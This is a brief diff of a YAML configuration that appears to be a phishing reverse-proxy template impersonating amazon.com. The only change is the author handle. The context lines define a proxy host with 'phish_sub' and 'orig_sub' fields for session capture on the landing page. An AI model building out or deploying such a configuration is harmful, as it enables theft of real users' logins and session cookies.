@@ -1,4 +1,4 @@
-author: '@customsync'
+author: '@an0nud4y'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true}
